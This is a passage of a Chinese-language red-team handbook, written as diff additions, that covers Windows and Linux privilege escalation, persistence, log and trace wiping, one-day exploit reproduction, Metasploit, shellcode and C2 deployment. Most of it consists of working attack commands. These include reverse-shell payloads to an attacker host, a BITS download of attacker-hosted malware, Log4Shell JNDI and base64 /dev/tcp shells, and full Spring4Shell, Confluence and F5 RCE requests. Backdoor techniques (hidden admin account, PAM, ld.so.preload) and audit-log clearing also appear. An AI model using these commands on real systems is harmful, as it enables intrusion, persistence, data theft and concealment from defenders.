+# SweetPotato
+SweetPotato.exe -p C:\shell.exe
+
+# PrintSpoofer (Windows 10 / Server 2019+)
+PrintSpoofer64.exe -i -c cmd
+
+# RoguePotato
+RoguePotato.exe -r attacker_ip -e "shell.exe"
+
+# GodPotato (.NET)
+GodPotato.exe -cmd "cmd /c whoami"
+```
+
+**令牌模拟**：
+```bash
+# Incognito
+incognito.exe list_tokens -u
+incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
+
+# PowerShell
+Import-Module .\Invoke-TokenManipulation.ps1
+Invoke-TokenManipulation -Enumerate
+Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "NT AUTHORITY\SYSTEM"
+```
+
+**AlwaysInstallElevated**：
+```bash
+# 检查
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# 都为 1 → msi 提权
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi
+```
+
+**DLL 劫持**：
+```bash
+# 1. 找 DLL 搜索路径
+Process Monitor (procmon) 过滤 Path
+# 看服务加载了哪些 DLL，路径里有哪些可写
+
+# 2. 编译恶意 DLL
+# msfvenom
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f dll -o evil.dll
+# 放可写路径，触发服务重启
+```
+
+**内核漏洞**：
+```bash
+# 找可用漏洞
+whoami /priv
+systeminfo
+# 找符合版本的 exp
+searchsploit windows 10 1903
+# Windows 提权漏洞
+# CVE-2021-1732 (Win32k)
+# CVE-2021-36934 (HiveNightmare)
+# CVE-2022-21882 (Win32k)
+# CVE-2023-23397 (Outlook)
+# PrintNightmare (CVE-2021-1675)
+```
+
+### 20.2 Linux 权限提升
+
+**信息收集**：
+```bash
+# 系统
+uname -a
+cat /etc/os-release
+cat /etc/issue
+
+# 用户
+id
+whoami
+sudo -l
+cat /etc/passwd
+cat /etc/shadow
+
+# 提权检查工具
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+./linpeas.sh
+
+# 内核漏洞
+./linux-exploit-suggester.sh
+# 或
+uname -r
+searchsploit linux kernel 5.15
+```
+
+**SUDO 提权**：
+```bash
+# 1. 查看 sudo 权限
+sudo -l
+# (ALL : ALL) NOPASSWD: /usr/bin/vim
+# → sudo vim -c ':!/bin/bash'
+
+# 2. GTFOBins 速查
+# https://gtfobins.github.io/
+# 常见：
+# vim → :!/bin/bash
+# less → !/bin/bash
+# find → find . -exec /bin/bash \;
+# awk → awk 'BEGIN {system("/bin/bash")}'
+# python → sudo python -c 'import os; os.system("/bin/bash")'
+# perl → sudo perl -e 'exec "/bin/bash";'
+# ruby → sudo ruby -e 'exec "/bin/bash"'
+# nmap --interactive
+# env → sudo env /bin/bash
+```
+
+**SUID 提权**：
+```bash
+# 1. 找 SUID 文件
+find / -perm -u=s -type f 2>/dev/null
+# 或
+find / -perm -4000 2>/dev/null
+
+# 2. 找非标准 SUID
+find / -perm -u=s -type f 2>/dev/null | grep -v -E '^/(bin|usr/bin|usr/sbin|sbin)'
+
+# 3. 常见利用
+# SUID bash
+./bash -p
+# SUID find
+find . -exec /bin/bash -p \;
+# SUID python
+python -c 'import os; os.execl("/bin/bash","bash","-p")'
+# SUID php
+php -r "pcntl_exec('/bin/bash', ['-p']);"
+# SUID strace
+strace -o /dev/null /bin/bash
+# SUID docker
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+**Capabilities 提权**：
+```bash
+# 1. 找有特殊 cap 的二进制
+getcap -r / 2>/dev/null
+# /usr/bin/python3.8 = cap_setuid+ep
+
+# 2. 利用
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+# 或
+getcap /usr/bin/python3.8
+# cap_dac_read_search → 读任意文件
+python3 -c 'import os; os.setuid(0); os.system("cat /etc/shadow")'
+```
+
+**Cron 提权**：
+```bash
+# 1. 查 cron
+crontab -l
+ls -la /etc/cron*
+cat /etc/crontab
+# 找以 root 运行的脚本
+
+# 2. 看脚本是否可写
+ls -la /etc/cron.daily/backup.sh
+# 可写 → 加 payload
+echo "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" >> /etc/cron.daily/backup.sh
+# 等待执行
+```
+
+**PATH 劫持**：
+```bash
+# 1. 看 sudo 配置
+sudo -l
+# (root) NOPASSWD: /usr/bin/less
+# less 调用了其他命令（如 lesspipe）
+
+# 2. 劫持
+cd /tmp
+echo '/bin/bash' > less
+chmod +x less
+export PATH=/tmp:$PATH
+sudo /usr/bin/less /etc/shadow
+# !bash
+```
+
+**计划任务 / systemd 提权**：
+```bash
+# systemd timer / service 可写
+ls -la /etc/systemd/system/*.service
+# 修改 ExecStart 指向恶意脚本
+
+# init.d
+ls -la /etc/init.d/
+# 可写 → 加 payload
+```
+
+**通配符 / Tar 提权**：
+```bash
+# cron 跑 tar cf /backup/*.tar *
+# 在目录下创建恶意文件
+echo '#!/bin/bash' > "--checkpoint-action=exec=sh shell.sh"
+echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > shell.sh
+chmod +x shell.sh
+touch "--checkpoint=1"
+# 等待 cron 执行
+```
+
+**NFS 提权**：
+```bash
+# 1. 检查
+cat /etc/exports
+# /tmp *(rw,no_root_squash)
+
+# 2. 攻击
+# 在攻击机
+mount -t nfs target:/tmp /mnt
+cp /bin/bash /mnt/rootbash
+chmod u+s /mnt/rootbash
+# 在目标机
+/tmp/rootbash -p
+```
+
+**Python Library Hijacking**：
+```bash
+# 1. 找 root 运行的 Python 脚本
+# 2. 看 PYTHONPATH / sys.path
+# 3. 在可写路径放置同名 .py
+```
+
+**内核漏洞**：
+```bash
+# DirtyPipe (CVE-2022-0847)
+# Linux 5.8 - 5.16.10
+uname -r
+# 5.15.0-xx
+# 下载 dirtypipe exploit
+# CVE-2022-2588 route4
+# CVE-2023-0386 OverlayFS
+# CVE-2021-3493 OverlayFS
+```
+
+### 20.3 Windows 持久化
+
+**计划任务**：
+```cmd
+schtasks /create /tn "WindowsUpdate" /tr "C:\shell.exe" /sc onlogon /ru system
+# 每分钟
+schtasks /create /tn "x" /tr "C:\shell.exe" /sc minute /mo 1 /ru system
+# 触发
+schtasks /run /tn "WindowsUpdate"
+```
+
+**注册表 Run**：
+```cmd
+# HKCU（当前用户）
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\shell.exe"
+
+# HKLM（所有用户，需要管理员）
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "WindowsUpdate" /t REG_SZ /d "C:\shell.exe"
+
+# 开机登录触发
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "x" /t REG_SZ /d "C:\shell.exe"
+```
+
+**服务**：
+```cmd
+sc create "WinSvc" binpath= "C:\shell.exe" type= own start= auto
+sc start "WinSvc"
+```
+
+**WMI Event**：
+```powershell
+# 触发条件：进程创建
+$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+  Name = "WindowsUpdate"
+  EventNamespace = "root\cimv2"
+  QueryLanguage = "WQL"
+  Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process'"
+}
+$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+  Name = "Updater"
+  CommandLineTemplate = "C:\shell.exe"
+}
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+  Filter = $Filter
+  Consumer = $Consumer
+}
+```
+
+**COM 劫持**：
+```cmd
+# HKCU\Software\Classes\CLSID\{...}\InprocServer32
+# 替换为恶意 DLL
+```
+
+**BITS 作业**：
+```cmd
+bitsadmin /create "WindowsUpdate"
+bitsadmin /addfile "WindowsUpdate" http://attacker/shell.exe C:\shell.exe
+bitsadmin /setnotifycmdline "WindowsUpdate" C:\shell.exe NORMAL
+bitsadmin /resume "WindowsUpdate"
+```
+
+**COM+ 应用程序**：
+```cmd
+# 注册恶意 COM 组件
+# 由系统服务加载
+```
+
+**辅助功能**：
+```cmd
+# 用 cmd.exe 替换 utilman.exe (Win+U 触发)
+takeown /f C:\Windows\System32\utilman.exe
+icacls C:\Windows\System32\utilman.exe /grant Administrators:F
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+# Win+U → SYSTEM cmd
+```
+
+**隐藏账户**：
+```cmd
+# 创建用户 + 隐藏
+net user hacker$ Pass123! /add
+net localgroup administrators hacker$ /add
+# 改注册表隐藏
+reg add HKLM\SAM\SAM\Domains\Account\Users\00000XXX /v F /t REG_BINARY /d 旧F值 /f
+# 在用户列表看不到
+```
+
+**Winlogon Helper DLL**：
+```cmd
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,shell.exe" /f
+```
+
+**AppInit_DLLs**：
+```cmd
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\evil.dll" /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
+```
+
+**CLR 劫持**：
+```cmd
+# 修改 .NET CLR 启动 DLL
+reg add "HKLM\Software\Microsoft\.NETFramework" /v AssemblyLoaderOptimization /t REG_SZ /d 2 /f
+# 需要在 .NET Framework 配置目录放 malicious.config
+```
+
+### 20.4 Linux 持久化
+
+**systemd 服务**：
+```bash
+# 1. 创建服务
+cat > /etc/systemd/system/updates.service <<EOF
+[Unit]
+Description=Update Service
+[Service]
+ExecStart=/bin/bash -c 'while true; do /tmp/shell.sh; sleep 60; done'
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# 2. 启动
+systemctl daemon-reload
+systemctl enable updates
+systemctl start updates
+```
+
+**Cron**：
+```bash
+# 1. 用户 cron
+crontab -e
+@reboot /tmp/shell.sh
+*/5 * * * * /tmp/shell.sh
+
+# 2. 系统 cron
+echo "* * * * * root /tmp/shell.sh" >> /etc/crontab
+echo "* * * * * root /tmp/shell.sh" > /etc/cron.d/updates
+```
+
+**bashrc / profile**：
+```bash
+# /etc/bashrc 或 ~/.bashrc
+echo '/tmp/shell.sh' >> ~/.bashrc
+# /etc/profile.d/
+echo '/tmp/shell.sh' > /etc/profile.d/updates.sh
+chmod +x /etc/profile.d/updates.sh
+```
+
+**init.d 脚本**：
+```bash
+cat > /etc/init.d/updates <<EOF
+#!/bin/sh
+/tmp/shell.sh &
+EOF
+chmod +x /etc/init.d/updates
+update-rc.d updates defaults  # Debian
+chkconfig --add updates        # CentOS
+```
+
+**SSH 公钥**：
+```bash
+mkdir ~/.ssh
+echo "ssh-rsa AAAA... attacker" >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
+```
+
+**SUID bash**：
+```bash
+cp /bin/bash /tmp/.rootbash
+chmod u+s /tmp/.rootbash
+/tmp/.rootbash -p
+```
+
+**动态链接库劫持**：
+```bash
+# 1. 找 root 调用的 SUID 二进制
+# 2. 看它加载哪些库
+strace /usr/bin/suid_binary 2>&1 | grep "open"
+# 3. 找可写路径
+# 4. 替换为恶意 .so
+```
+
+**PAM 后门**：
+```bash
+# /etc/pam.d/
+# 添加 auth sufficient pam_permit.so
+# 任意密码都能登录
+# 详细：patch pam_unix.so 接受 magic password
+```
+
+**ld.so.preload**：
+```bash
+# /etc/ld.so.preload
+echo "/tmp/evil.so" > /etc/ld.so.preload
+# 任何进程都会先加载 evil.so
+# evil.so 里 hook __libc_start_main → 启动恶意代码
+```
+
+**motd 脚本**：
+```bash
+# /etc/update-motd.d/
+# 用户登录时执行
+echo '/tmp/shell.sh' > /etc/update-motd.d/99-evil
+chmod +x /etc/update-motd.d/99-evil
+```
+
+**容器内持久化**：
+```bash
+# Docker
+docker run -d --name=persistent -v /:/mnt --restart=always alpine chroot /mnt /bin/sh -c "while true; do /tmp/shell.sh; sleep 60; done"
+```
+
+### 20.5 痕迹清理
+
+**Windows**：
+```cmd
+# 1. 关闭日志审计
+auditpol /set /category:"Account Logon" /success:disable /failure:disable
+auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+auditpol /set /category:"Object Access" /success:disable /failure:disable
+
+# 2. 清日志
+wevtutil cl Security
+wevtutil cl System
+wevtutil cl Application
+wevtutil cl "Windows PowerShell"
+
+# 3. 清除最近文档
+del /q /f %APPDATA%\Microsoft\Windows\Recent\*
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
+
+# 4. 清除 Prefetch
+del /q /f C:\Windows\Prefetch\*
+# 关闭 Prefetch
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
+
+# 5. 清除时间戳 (Timestomp)
+# SetMACE 工具
+SetMACE.exe -f "C:\shell.exe" -m "01/01/2020 12:00:00" -a "01/01/2020 12:00:00" -c "01/01/2020 12:00:00" -e "01/01/2020 12:00:00"
+# 改 $STANDARD_INFORMATION + $FILE_NAME 时间戳
+
+# 6. 清除事件日志中的特定事件
+# 4624/4625 (登录)
+# 4672 (特权登录)
+# 4688 (进程创建)
+# 4720 (用户创建)
+# 4724 (密码重置)
+# 4728/4732 (组成员添加)
+# 4738 (用户修改)
+# 4740 (账户锁定)
+# 5145 (网络共享访问检查)
+
+# 7. 清除 PowerShell 历史
+Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+Clear-History
+
+# 8. 清除特定进程的 EDR 痕迹
+# (详细见 EDR 绕过章节)
+```
+
+**Linux**：
+```bash
+# 1. 清历史
+history -c
+unset HISTFILE
+echo "" > ~/.bash_history
+ln -sf /dev/null ~/.bash_history
+
+# 2. 关闭 history
+export HISTSIZE=0
+export HISTFILESIZE=0
+# /etc/profile
+HISTCONTROL=ignorespace  # 加空格不记录
+HISTIGNORE="ls:cd:exit:wget:curl:scp:rm:cp:mv"
+
+# 3. 清日志
+cat /dev/null > /var/log/auth.log
+cat /dev/null > /var/log/syslog
+cat /dev/null > /var/log/kern.log
+cat /dev/null > /var/log/messages
+cat /dev/null > /var/log/wtmp
+cat /dev/null > /var/log/btmp
+cat /dev/null > /var/log/lastlog
+# 或
+echo "" > /var/log/auth.log
+# 时间戳伪造
+sed -i 's/old_timestamp/new_timestamp/g' /var/log/auth.log
+
+# 4. 清除 utmp / wtmp
+# /var/run/utmp
+# /var/log/wtmp
+# /var/log/btmp
+# utmpcleaner 工具
+
+# 5. 清除特定行
+sed -i '/192.168.1.100/d' /var/log/auth.log
+sed -i '/attacker_ip/d' /var/log/*
+
+# 6. 清除 atime / ctime
+# touch -t 旧时间
+touch -t 202001011200.00 /tmp/shell
+# 或
+srm -z /tmp/shell  # 安全删除 + 改时间
+```
+
+### 20.6 权限提升与持久化报告模板
+
+```
+【权限提升与持久化报告】CASE-YYYY-NNNN
+
+【初始权限】
+- 入口: <WebShell / 钓鱼 / RCE>
+- 权限: <www-data / IIS AppPool / domain user>
+- 操作系统: <Windows Server 2019 / Ubuntu 22.04>
+
+【提权路径】
+- Windows:
+  1. <AlwaysInstallElevated>
+  2. <UAC bypass (fodhelper)>
+  3. <Service 弱权限>
+  4. <Potato 提权到 SYSTEM>
+- Linux:
+  1. <SUDO NOPASSWD / vim>
+  2. <SUID /usr/bin/python3.8>
+  3. <Capabilities cap_setuid+ep>
+  4. <Crontab 提权到 root>
+
+【持久化技术】
+- Windows: <Run 注册表 / 计划任务 / WMI Event>
+- Linux: <systemd service / cron / bashrc>
+- 反检测: <清除日志 / 改时间戳 / 隐藏账户>
+
+【痕迹清理】
+- Windows: <wevtutil cl / Prefetch / PowerShell history>
+- Linux: <history -c / 清 /var/log / utmpcleaner>
+- 时间戳: <SetMACE / touch -t>
+
+【关键发现】
+- 漏洞: <UAC 没启用 / 弱 SUDO / SUID 滥用>
+- 提权路径: <5 条>
+- 持久化路径: <8 条>
+
+【修复建议】
+- UAC 全开
+- 最小 SUDO 权限
+- 移除不必要 SUID
+- 服务最小权限
+- 关闭可写计划任务目录
+- LAPS 部署
+
+【防御视角】
+- 端点：EDR / Sysmon / ELK
+- 行为：异常时间/异常命令/异常账户
+- 网络：异常出站连接
+- 响应：自动化隔离/恢复
+```
+
+---
+
+## 第 21 章 · 漏洞利用工程专章
+
+**目的**：研究员要会利用现成漏洞（Exploit-DB / Metasploit / One-day），编写自定义 EXP，搞 CVE 复现。
+
+### 21.1 Exploit-DB / 漏洞库
+
+```bash
+# 搜索
+searchsploit apache 2.4
+searchsploit -m 42966  # 拷贝到当前目录
+# 离线数据库
+# /usr/share/exploitdb/exploits/
+
+# GitHub Advisory
+# https://github.com/advisories
+
+# CVE 库
+# https://nvd.nist.gov/vuln/search
+# https://cve.mitre.org
+# https://www.cvedetails.com
+
+# 国内
+# https://www.seebug.org
+# http://www.cnnvd.org.cn
+# https://src.sjtu.edu.cn
+# https://www.cnvd.org.cn
+```
+
+**漏洞利用框架**：
+```bash
+# Metasploit
+msfconsole
+search <keyword>
+use exploit/multi/http/...
+set RHOSTS target
+set LHOST attacker
+exploit
+
+# pocs3 (Python)
+# https://github.com/knownsec/pocsuite3
+pocsuite -r poc.py -u target
+
+# nuclei
+nuclei -u target -t cves/2023/CVE-2023-XXXX.yaml
+
+# xray
+xray webscan --plugins sqldet --url target
+
+# Goby
+# 国界
+goby --cli -t target
+```
+
+### 21.2 经典 One-day 复现
+
+**MS17-010（永恒之蓝）**：
+```bash
+# 1. 检测
+nmap -p445 --script smb-vuln-ms17-010 target
+msfconsole
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS target
+run
+
+# 2. 利用
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS target
+set LHOST attacker
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+
+# 3. 验证
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > hashdump
+```
+
+**CVE-2019-0708（BlueKeep）**：
+```bash
+msfconsole
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS target
+set LHOST attacker
+exploit
+```
+
+**CVE-2020-0796（SMBGhost）**：
+```bash
+# 扫描
+nmap -p445 --script smb2-capable target
+
+# 利用
+git clone https://github.com/danigargu/CVE-2020-0796
+cd CVE-2020-0796
+python3 exploit.py -ip target
+```
+
+**Log4Shell (CVE-2021-44228)**：
+```bash
+# 1. 检测
+# 工具：log4j-scan
+python3 log4j-scan.py -u https://target
+
+# 2. 触发 + 接收
+# nc 监听
+nc -lvp 1389
+# payload
+${jndi:ldap://attacker:1389/exp}
+# 配合 marshalsec 提供 LDAP/RMI 服务
+java -cp marshalsec-all.jar marshalsec.jndi.LDAPRefServer http://attacker:8888/#Exploit
+
+# 3. 反弹 shell
+# Exploit.java
+Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}");
+# 起 web server 提供 Exploit.class
+python3 -m http.server 8888
+```
+
+**Spring4Shell (CVE-2022-22965)**：
+```bash
+curl -X POST http://target/path -H "Content-Type: application/x-www-form-urlencoded" -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+```
+
+**ProxyLogon (CVE-2021-26855)**：
+```bash
+# Exchange SSRF → 写文件
+python3 proxylogon.py -d domain.local -u admin -p pass -t target
+```
+
+**ProxyShell (CVE-2021-34473 / 34514 / 31207)**：
+```bash
+python3 proxylogon.py -d domain.local -u admin -p pass -t target -e
+```
+
+**Confluence (CVE-2022-26134)**：
+```bash
+curl http://target/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Resp%22%2C%23a%29%29%7D%7D/
+```
+
+**Confluence OGNL (CVE-2023-22527)**：
+```bash
+# Confluence Data Center / Server
+# 模板注入 RCE
+```
+
+**F5 BIG-IP (CVE-2022-1388)**：
+```bash
+curl -sk https://target/mgmt/tm/util/bash -H "Connection: close, X-F5-Auth-Token" -H "Content-Type: application/json" -d '{"command":"run","utilCmdArgs":"-c id"}'
+```
+
+**Confluence 模板注入 (CVE-2023-22515)**：
+```bash
+# 权限绕过 + SSTI → RCE
+```
+
+### 21.3 Metasploit 框架
+
+**核心组件**：
+```bash
+# 1. 辅助模块（Auxiliary）
+#   - scanner
+#   - fuzz
+#   - gather
+#   - analyze
+#   - admin
+# 2. 漏洞利用模块（Exploit）
+# 3. 攻击载荷（Payload）
+# 4. 后渗透（Post）
+# 5. 编码器（Encoder）
+# 6. NOP 生成器（NOP）
+# 7. 插件（Plugin）
+# 8. 监听器（Handler）
+```
+
+**常用命令**：
+```bash
+# 启动
+msfconsole
+# 加速启动
+msfconsole -q
+
+# 搜索
+search <keyword>
+search type:exploit name:smb
+
+# 使用模块
+use exploit/windows/smb/ms17_010_eternalblue
+
+# 设置选项
+set RHOSTS target
+set RPORT 445
+set LHOST attacker
+set LPORT 4444
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# 执行
+exploit
+run
+check  # 仅检测
+
+# 后台
+background
+# 切换
+sessions -l
+sessions -i 1
+
+# 帮助
+help
+info
+show options
+show targets
+show payloads
+```
+
+**Meterpreter**：
+```bash
+# 1. 系统命令
+sysinfo
+getuid
+getsystem
+getprivs
+ps
+kill <pid>
+migrate <pid>
+shutdown
+reboot
+
+# 2. 文件操作
+pwd
+ls
+cd
+cat
+download /remote/file /local/path
+upload /local/file /remote/path
+edit
+rm
+mkdir
+
+# 3. 网络
+ipconfig
+ifconfig
+arp
+netstat
+route
+portfwd add -l 8080 -r 127.0.0.1 -p 80
+portfwd list
+portfwd delete
+
+# 4. 用户
+getuid
+getsystem
+hashdump
+load mimikatz
+wdigest
+kerberos
+
+# 5. 提权
+getsystem
+# 自动提权
+use exploit/windows/local/<suggested>
+# bypassuac
+
+# 6. 持久化
+run persistence -h
+run persistence -U -i 5 -p 4444 -r attacker
+
+# 7. 键盘记录
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+# 8. 屏幕截图
+screenshot
+
+# 9. 摄像头
+webcam_list
+webcam_snap
+
+# 10. 录音
+record_mic
+
+# 11. shell
+shell
+# exit 退出
+
+# 12. 退出
+exit
+```
+
+### 21.4 自定义 EXP 编写
+
+**Python EXP 框架**：
+```python
+#!/usr/bin/env python3
+import requests
+import sys
+import re
+
+class Exploit:
+    def __init__(self, target):
+        self.target = target
+        self.session = requests.Session()
+    
+    def check(self):
+        """指纹检测"""
+        r = self.session.get(f"http://{self.target}/")
+        return "Apache" in r.headers.get("Server", "")
+    
+    def detect(self):
+        """漏洞检测"""
+        payload = "/etc/passwd"
+        r = self.session.get(f"http://{self.target}{payload}")
+        return "root:" in r.text
+    
+    def exploit(self, cmd):
+        """漏洞利用"""
+        # 注入 payload
+        payload = f"{{{{ {cmd} }}}}"
+        r = self.session.post(f"http://{self.target}/api", data={"q": payload})
+        return r.text
+    
+    def shell(self):
+        """交互 shell"""
+        import socket
+        import threading
+        # 反弹 shell
+        ...
+
+if __name__ == "__main__":
+    target = sys.argv[1]
+    exp = Exploit(target)
+    if exp.detect():
+        result = exp.exploit("id")
+        print(f"[+] Vulnerable! Result: {result}")
+    else:
+        print("[-] Not vulnerable")
+```
+
+**Pwntools（pwn 漏洞利用）**：
+```python
+from pwn import *
+context.arch = "amd64"
+context.log_level = "info"
+
+# 连接
+r = remote("target", 1337)
+# 或
+r = process("./vuln")
+
+# 接收
+r.recvline()
+r.recvuntil(b"> ")
+data = r.recv(1024)
+
+# 发送
+r.sendline(b"AAAA")
+r.send(b"BBBB")
+
+# payload
+payload = b"A" * 64
+payload += p64(0x401234)  # 返回地址
+payload += p64(0xdeadbeef)  # 参数
+r.sendline(payload)
+
+# 交互
+r.interactive()
+```
+
+**ROPgadget / ROP chain**：
+```bash
+# 找 ROP gadgets
+ROPgadget --binary ./vuln
+ROPgadget --binary ./vuln --ropchain
+
+# 自动 ROP 链
+ropper --file ./vuln --search "pop rdi"
+```
+
+**One_gadget**：
+```bash
+# 找 glibc one_gadget
+one_gadget /lib/x86_64-linux-gnu/libc.so.6
+# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   rsp & 0xf == 0
+#   rcx == NULL
+```
+
+### 21.5 Shellcode 编写
+
+**msfvenom**：
+```bash
+# Linux reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker LPORT=4444 -f elf -o shell32.elf
+
+# Windows reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o m.exe
+
+# Web shell
+msfvenom -p php/reverse_php LHOST=attacker LPORT=4444 -f raw -o shell.php
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker LPORT=4444 -f aspx -o shell.aspx
+
+# 编码绕过
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -e x64/xor -i 3 -f exe -o encoded.exe
+```
+
+**手工 Shellcode（Python）**：
+```python
+# x86_64 execve("/bin/sh")
+shellcode = (
+    b"\x48\x31\xf6"                  # xor rsi, rsi
+    b"\x56"                          # push rsi
+    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rdi, "/bin//sh"
+    b"\x57"                          # push rdi
+    b"\x54"                          # push rsp
+    b"\x5f"                          # pop rdi
+    b"\x6a\x3b"                      # push 0x3b
+    b"\x58"                          # pop rax
+    b"\x99"                          # cdq (rdx = 0)
+    b"\x0f\x05"                      # syscall
+)
+```
+
+**免杀**：
+```python
+# 1. 编码
+# 2. XOR
+# 3. 字符串拆分 + 运行时拼接
+# 4. 进程镂空 (Process Hollowing)
+# 5. 反射 DLL 注入
+# 6. 模块化 (Modular) shellcode
+# 7. 内存执行
+```
+
+### 21.6 漏洞利用报告模板
+
+```
+【漏洞利用报告】CASE-YYYY-NNNN
+
+【漏洞信息】
+- CVE: <CVE-2023-XXXX>
+- 名称: <RCE / LPE / SQLi>
+- 厂商: <vendor>
+- 产品: <product>
+- 版本: <version>
+- CVSS: <9.8>
+- 漏洞类型: <类型>
+- 危害: <RCE / 提权 / 信息泄露>
+
+【复现环境】
+- 目标: <OS / 应用版本>
+- 网络: <可达性>
+- 工具: <msf / 自写 EXP / PoC>
+
+【复现步骤】
+1. <步骤 1>
+2. <步骤 2>
+3. <步骤 3>
+
+【PoC】
+<code>
+</code>
+
+【利用结果】
+- <命令执行 / 提权 / 数据获取>
+- <截图 / 录像>
+- <访问的敏感信息>
+
+【危害证明】
+- <资产清单>
+- <数据访问范围>
+- <横向移动可能性>
+
+【修复建议】
+- <厂商补丁>
+- <升级版本>
+- <临时缓解>
+
+【防御视角】
+- 主动：漏洞扫描 / SBOM
+- 被动：WAF / IDS / IPS
+- 响应：补丁管理 / 应急响应
+```
+
+---
+
+## 第 22 章 · 红队基础设施专章
+
+**目的**：红队行动要搭建 C2 基础设施、流量伪装、反检测通信、域前置、回调服务器。本章覆盖完整 C2 工程。
+
+### 22.1 C2 框架选型
+
+| 框架 | 语言 | 平台 | 特点 |
+|------|------|------|------|
+| Cobalt Strike | Java | 跨平台 | 商业，强 |
+| Mythic | Python/Go | 跨平台 | 开源，模块化 |
+| Sliver | Go | 跨平台 | 开源，跨平台 |
+| Covenant | .NET | Windows | 开源 |
+| Empire | Python | 跨平台 | PowerShell 优先 |
+| Merlin | Go | 跨平台 | HTTP/2 |
+| Havoc | C++ | 跨平台 | 新兴，开源 |
+| Brute Ratel | C | 跨平台 | 商业，新兴 |
+
+### 22.2 C2 部署
+
+**Cobalt Strike 部署**：
+```bash
+# 1. 启动团队服务器
+./teamserver <ip> <password> [<c2 profile>]
+
+# 2. 客户端连接
+./cobaltstrike
+
+# 3. 创建 listener
+#   - windows/beacon_http
+#   - windows/beacon_https
+#   - windows/beacon_dns
+#   - windows/beacon_smb
+#   - windows/beacon_tcp
+
+# 4. 生成 payload
+#   Attacks → Packages → Windows Executable
+#   选择 listener
+#   生成 artifact
+
+# 5. 操作
+#   - beacon 右键 → interact
+#   - 输入命令
+```
+
+**Sliver 部署**：
+```bash
+# 1. 启动 server
+./sliver-server
+
+# 2. 客户端
+./sliver-client
+
